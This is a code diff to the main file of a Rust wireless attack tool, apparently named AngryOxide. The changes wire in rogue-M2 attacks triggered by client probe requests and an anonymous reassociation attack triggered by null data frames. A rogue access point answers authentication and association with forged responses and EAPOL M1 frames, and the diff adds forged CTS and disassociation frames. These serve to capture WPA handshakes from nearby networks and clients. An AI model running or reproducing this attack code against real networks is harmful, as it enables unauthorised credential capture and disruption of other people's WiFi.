@@ -2,7 +2,6 @@ mod ascii;
 mod attack;
 mod auth;
 mod devices;
-mod ntlook;
 mod rawsocks;
 mod status;
 mod tx;
@@ -12,7 +11,10 @@ extern crate libc;
 extern crate nix;
 
 use anyhow::Result;
-use attack::{attack_authentication_from_ap, m1_retrieval_attack, deauth_attack};
+use attack::{
+    anon_reassociation_attack, deauth_attack, m1_retrieval_attack, m1_retrieval_attack_phase_2,
+    rogue_m2_attack_directed, rogue_m2_attack_undirected,
+};
 
 use crossterm::event::{poll, Event, KeyCode};
 use crossterm::terminal::{
@@ -23,15 +25,19 @@ use libwifi::frame::components::{MacAddress, RsnAkmSuite, RsnCipherSuite, WpaAkm
 use libwifi::frame::{DataFrame, NullDataFrame};
 use nix::unistd::geteuid;
 
-use ntlook::{
+use nl80211_ng::channels::WiFiChannel;
+use nl80211_ng::{
     get_interface_info_name, set_interface_chan, set_interface_down, set_interface_mac,
-    set_interface_monitor, set_interface_station, set_interface_up,
+    set_interface_monitor, set_interface_station, set_interface_up, Interface,
 };
 
 use radiotap::field::{AntennaSignal, Field};
 use radiotap::Radiotap;
 use rawsocks::{open_socket_rx, open_socket_tx};
-use tx::build_ack;
+use tx::{
+    build_ack, build_association_response, build_authentication_response, build_cts,
+    build_disassocation_from_client, build_eapol_m1,
+};
 
 use crate::ascii::get_art;
 use crate::auth::HandshakeStorage;
@@ -191,17 +197,24 @@ pub struct OxideRuntime {
     access_points: WiFiDeviceList<AccessPoint>,
     unassoc_clients: WiFiDeviceList<Station>,
     rogue_client: MacAddress,
+    rogue_ap: MacAddress,
     handshake_storage: HandshakeStorage,
     frame_count: u64,
     eapol_count: u64,
     error_count: u64,
-    interface: ntlook::Interface,
+    interface: Interface,
     counters: Counters,
     status_log: status::MessageLog,
+    current_channel: WiFiChannel,
 }
 
 impl OxideRuntime {
-    pub fn new(interface_name: String, notx: bool, rogue: Option<String>, targets: Option<Vec<String>>) -> Self {
+    pub fn new(
+        interface_name: String,
+        notx: bool,
+        rogue: Option<String>,
+        targets: Option<Vec<String>>,
+    ) -> Self {
         let access_points = WiFiDeviceList::new();
         let unassoc_clients = WiFiDeviceList::new();
         let handshake_storage = HandshakeStorage::new();
@@ -215,20 +228,23 @@ impl OxideRuntime {
         };
 
         let target_vec: Vec<MacAddress> = if let Some(vec_targets) = targets {
-            vec_targets.into_iter().map(|f| MacAddress::from_str(&f).unwrap()).collect()
+            vec_targets
+                .into_iter()
+                .map(|f| MacAddress::from_str(&f).unwrap())
+                .collect()
         } else {
-            vec!()
+            vec![]
         };
 
-        let idx = iface.index.unwrap();
+        let idx = iface.index;
 
         println!(
             "
-         █████  ███    ██  ██████  ██████  ██    ██      ██████  ██   ██ ██ ██████  ███████ 
-        ██   ██ ████   ██ ██       ██   ██  ██  ██      ██    ██  ██ ██  ██ ██   ██ ██      
-        ███████ ██ ██  ██ ██   ███ ██████    ████       ██    ██   ███   ██ ██   ██ █████   
-        ██   ██ ██  ██ ██ ██    ██ ██   ██    ██        ██    ██  ██ ██  ██ ██   ██ ██      
-        ██   ██ ██   ████  ██████  ██   ██    ██         ██████  ██   ██ ██ ██████  ███████"
+     █████  ███    ██  ██████  ██████  ██    ██      ██████  ██   ██ ██ ██████  ███████ 
+    ██   ██ ████   ██ ██       ██   ██  ██  ██      ██    ██  ██ ██  ██ ██   ██ ██      
+    ███████ ██ ██  ██ ██   ███ ██████    ████       ██    ██   ███   ██ ██   ██ █████   
+    ██   ██ ██  ██ ██ ██    ██ ██   ██    ██        ██    ██  ██ ██  ██ ██   ██ ██      
+    ██   ██ ██   ████  ██████  ██   ██    ██         ██████  ██   ██ ██ ██████  ███████"
         );
 
         println!("{}", iface.pretty_print());
@@ -246,12 +262,17 @@ impl OxideRuntime {
         thread::sleep(Duration::from_millis(500));
 
         let mut rogue_client = MacAddress::random();
+        let rogue_ap = MacAddress::random();
+
         if let Some(rogue) = rogue {
             if let Ok(mac) = MacAddress::from_str(&rogue) {
                 println!("Setting {} mac to {} (from rogue)", interface_name, mac);
                 rogue_client = mac;
             } else {
-                println!("Invalid rogue supplied - randomizing {} mac to {}", interface_name, rogue_client);
+                println!(
+                    "Invalid rogue supplied - randomizing {} mac to {}",
+                    interface_name, rogue_client
+                );
             }
         } else {
             println!("Randomizing {} mac to {}", interface_name, rogue_client);
@@ -259,8 +280,16 @@ impl OxideRuntime {
         set_interface_mac(idx, &rogue_client.0).ok();
 
         thread::sleep(Duration::from_millis(500));
-        println!("Setting {} monitor mode.", interface_name);
-        set_interface_monitor(idx, iface.active_monitor.unwrap_or_default()).ok();
+        println!(
+            "Setting {} monitor mode. (active {})",
+            interface_name,
+            iface.phy.clone().unwrap().active_monitor.is_some_and(|x| x)
+        );
+        set_interface_monitor(
+            idx,
+            iface.phy.clone().unwrap().active_monitor.is_some_and(|x| x),
+        )
+        .ok();
 
         thread::sleep(Duration::from_millis(500));
         println!("Setting {} up.", interface_name);
@@ -299,9 +328,11 @@ impl OxideRuntime {
             access_points,
             unassoc_clients,
             rogue_client,
+            rogue_ap,
             interface: iface,
             counters: Counters::default(),
             status_log: status::MessageLog::new(100),
+            current_channel: WiFiChannel::Channel2GHz(1),
         }
     }
 }
@@ -319,6 +350,7 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
         }
     };
     let current_channel = oxide.interface.frequency.clone().unwrap().channel.unwrap();
+    oxide.current_channel = current_channel.clone();
     let channel_u8: u8 = current_channel.get_channel_number();
     oxide.frame_count += 1;
     let payload = &packet[radiotap.header.length..];
@@ -337,12 +369,16 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                     .unwrap_or(AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?);
                 if bssid.is_real_device() {
                     let station_info = &beacon_frame.station_info;
+                    let ssid = station_info
+                        .ssid
+                        .as_ref()
+                        .map(|nssid| nssid.replace('\0', ""));
                     let ap = oxide.access_points.add_or_update_device(
                         bssid,
                         &AccessPoint::new(
                             bssid,
                             signal_strength,
-                            station_info.ssid.clone(),
+                            ssid,
                             station_info.ds_parameter_set,
                             Some(APFlags {
                                 apie_essid: station_info.ssid.as_ref().map(|_| true),
@@ -387,11 +423,11 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                     ap.beacon_count += 1;
                 };
                 let _ = m1_retrieval_attack(oxide, &bssid);
-                let _ = deauth_attack(oxide, &bssid);
-                
+                //let _ = deauth_attack(oxide, &bssid);
             }
             Frame::ProbeRequest(probe_request_frame) => {
                 let client_mac = probe_request_frame.header.address_2; // MAC address of the client
+                let ap_mac = probe_request_frame.header.address_1; // MAC address of the client
                 let bssid = probe_request_frame.header.address_3; // MAC address of the AP (BSSID)
                 let signal_strength = radiotap
                     .antenna_signal
@@ -399,7 +435,7 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                 let ssid = &probe_request_frame.station_info.ssid;
 
                 if client_mac.is_real_device() && client_mac != oxide.rogue_client {
-                    if !bssid.is_broadcast() {
+                    if !ap_mac.is_broadcast() {
                         // Directed probe request
                         match ssid {
                             Some(ssid) => {
@@ -415,6 +451,8 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                             }
                             None => {}
                         }
+                        // Probe request attack - Begin our RogueM2 attack procedure.
+                        rogue_m2_attack_directed(oxide, probe_request_frame)?;
                     } else {
                         // undirected probe request
 
@@ -442,6 +480,9 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                                 );
                             }
                         }
+
+                        // Probe request attack - Begin our RogueM2 attack procedure.
+                        rogue_m2_attack_undirected(oxide, probe_request_frame)?;
                     }
                 }
             }
@@ -455,12 +496,16 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                     .unwrap_or(AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?);
                 if bssid.is_real_device() {
                     let station_info = &probe_response_frame.station_info;
+                    let ssid = station_info
+                        .ssid
+                        .as_ref()
+                        .map(|nssid| nssid.replace('\0', ""));
                     oxide.access_points.add_or_update_device(
                         *bssid,
                         &AccessPoint::new(
                             *bssid,
                             signal_strength,
-                            probe_response_frame.station_info.ssid.clone(),
+                            ssid,
                             probe_response_frame.station_info.ds_parameter_set,
                             Some(APFlags {
                                 apie_essid: station_info.ssid.as_ref().map(|_| true),
@@ -502,7 +547,7 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                             oxide.rogue_client,
                         ),
                     );
-                    let _ = m1_retrieval_attack(oxide, &bssid);
+                    let _ = m1_retrieval_attack(oxide, bssid);
                 };
             }
             Frame::Authentication(auth_frame) => {
@@ -513,6 +558,7 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                 let signal = radiotap
                     .antenna_signal
                     .unwrap_or(AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?);
+
                 if auth_frame.auth_algorithm == 0 {
                     // Open system (Which can be open or WPA2)
                     if auth_frame.auth_seq == 1 {
@@ -526,6 +572,17 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                             client,
                             &Station::new_unassoc_station(client, signal, vec![]),
                         );
+
+                        if ap_addr == oxide.rogue_client {
+                            // We need to send an auth back
+                            let frx = build_authentication_response(
+                                &client,
+                                &ap_addr,
+                                &ap_addr,
+                                oxide.counters.sequence3(),
+                            );
+                            write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
+                        }
                     } else if auth_frame.auth_seq == 2 {
                         //// From AP
                         let client = auth_frame.header.address_1;
@@ -544,7 +601,7 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                             ),
                         );
 
-                        if client.0[0..3] != oxide.rogue_client.0[0..3] {
+                        if client != oxide.rogue_client {
                             // If it's not our rogue client that it's responding to.
                             oxide.unassoc_clients.add_or_update_device(
                                 client,
@@ -556,7 +613,7 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                                 ),
                             );
                         } else {
-                            let _ = attack_authentication_from_ap(
+                            let _ = m1_retrieval_attack_phase_2(
                                 &ap_addr,
                                 &oxide.rogue_client.clone(),
                                 oxide,
@@ -713,6 +770,21 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                     );
                     oxide.access_points.add_or_update_device(ap_mac, &ap);
                 };
+
+                if ap_mac == oxide.rogue_client {
+                    // We need to send an auth back
+                    let frx = build_association_response(
+                        &client_mac,
+                        &ap_mac,
+                        &ap_mac,
+                        oxide.counters.sequence3(),
+                    );
+                    write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
+                    // Then an M1
+                    let frx =
+                        build_eapol_m1(&client_mac, &ap_mac, &ap_mac, oxide.counters.sequence3());
+                    write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
+                }
             }
             Frame::AssociationResponse(assoc_response_frame) => {
                 // Assumption:
@@ -721,10 +793,11 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                 let client_mac = assoc_response_frame.header.address_1; // MAC address of the client
                 let bssid = assoc_response_frame.header.address_2; // MAC address of the AP (BSSID)
 
-                if client_mac.0[0..3] == oxide.rogue_client.0[0..3] {
+                // My attempt at sending ack from userspace.
+                /* if client_mac.0[0..3] == oxide.rogue_client.0[0..3] {
                     let ack = build_ack(&bssid);
                     write_packet(oxide.tx_socket.as_raw_fd(), &ack);
-                }
+                } */
 
                 if bssid.is_real_device()
                     && client_mac.is_real_device()
@@ -889,7 +962,7 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                 };
             }
             Frame::Rts(frame) => {
-                // println!("RTS: {} => {}", frame.source, frame.destination); */
+                // Most drivers (Mediatek, Ralink, Atheros) don't seem to be actually sending these to userspace (on linux).
                 let source_mac = frame.source; // MAC address of the source
                 let dest_mac = frame.destination; // MAC address of the destination
                 let from_ds: bool = frame.frame_control.from_ds();
@@ -911,6 +984,19 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                     dest_mac
                 };
 
+                if dest_mac == oxide.rogue_client {
+                    oxide.status_log.add_message(StatusMessage::new(
+                        MessageType::Error,
+                        format!("RTS: {} => {}", frame.source, frame.destination),
+                    ));
+                    let frx = build_cts(&source_mac);
+                    let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+                } else {
+                    oxide.status_log.add_message(StatusMessage::new(
+                        MessageType::Error,
+                        format!("RTS NOT US: {} => {}", frame.source, frame.destination),
+                    ));
+                }
                 let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
                 let signal = radiotap
                     .antenna_signal
@@ -1144,6 +1230,7 @@ fn handle_data_frame(
     let dest = data_frame.header().dest();
     let from_ds: bool = data_frame.header().frame_control.from_ds();
     let to_ds: bool = data_frame.header().frame_control.to_ds();
+    let powersave: bool = data_frame.header().frame_control.pwr_mgmt();
     let ap_addr = if from_ds && !to_ds {
         data_frame.header().address_2
     } else if !from_ds && to_ds {
@@ -1160,11 +1247,6 @@ fn handle_data_frame(
         data_frame.header().address_1
     };
 
-    if station_addr.0[0..3] == oxide.rogue_client.0[0..3] {
-        let ack = build_ack(&ap_addr);
-        write_packet(oxide.tx_socket.as_raw_fd(), &ack);
-    }
-
     let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
     let signal = rthdr
         .antenna_signal
@@ -1172,7 +1254,6 @@ fn handle_data_frame(
 
     if station_addr.is_real_device() && station_addr != oxide.rogue_client {
         // Make sure this isn't a broadcast or something
-
         let client = &Station::new_station(
             station_addr,
             if to_ds {
@@ -1185,6 +1266,8 @@ fn handle_data_frame(
         clients.add_or_update_device(station_addr, client);
         oxide.unassoc_clients.remove_device(&station_addr);
     }
+
+    // Create and Add/Update AccessPoint
     let ap = AccessPoint::new_with_clients(
         ap_addr,
         if from_ds {
@@ -1200,6 +1283,7 @@ fn handle_data_frame(
     );
     oxide.access_points.add_or_update_device(ap_addr, &ap);
 
+    // Handle frames that contain EAPOL.
     if let Some(eapol) = data_frame.eapol_key().clone() {
         oxide.eapol_count += 1;
         let ap = if let Some(ap) = oxide.access_points.get_device(&ap_addr) {
@@ -1209,9 +1293,17 @@ fn handle_data_frame(
         };
 
         let essid = ap.ssid.clone();
-        
-        if station_addr == oxide.rogue_client && oxide.handshake_storage.has_m1_for_ap(&ap_addr){
-            return Ok(());
+
+        if station_addr == oxide.rogue_client {
+            let frx = build_disassocation_from_client(
+                &ap_addr,
+                &station_addr,
+                oxide.counters.sequence2(),
+            );
+            let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+            if oxide.handshake_storage.has_m1_for_ap(&ap_addr) {
+                return Ok(());
+            }
         }
 
         let result = oxide.handshake_storage.add_or_update_handshake(
@@ -1262,6 +1354,7 @@ fn handle_null_data_frame(
 ) -> Result<(), String> {
     let from_ds: bool = data_frame.header().frame_control.from_ds();
     let to_ds: bool = data_frame.header().frame_control.to_ds();
+    let powersave: bool = data_frame.header().frame_control.pwr_mgmt();
     let ap_addr = if from_ds && !to_ds {
         data_frame.header().address_2
     } else if !from_ds && to_ds {
@@ -1312,6 +1405,13 @@ fn handle_null_data_frame(
         oxide.rogue_client,
     );
     oxide.access_points.add_or_update_device(ap_addr, &ap);
+
+    // Check PS State:
+    if !powersave && station_addr != oxide.rogue_client {
+        // Client is awake... potentially... try reassociation attack?
+        anon_reassociation_attack(oxide, &ap_addr)?;
+    }
+
     Ok(())
 }
 
@@ -1373,7 +1473,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         "Starting...".to_string(),
     ));
     let iface = oxide.interface.clone();
-    let idx = iface.index.unwrap();
+    let idx = iface.index;
     let interface_name =
         String::from_utf8(iface.name.unwrap()).expect("cannot get interface name from bytes.");
 
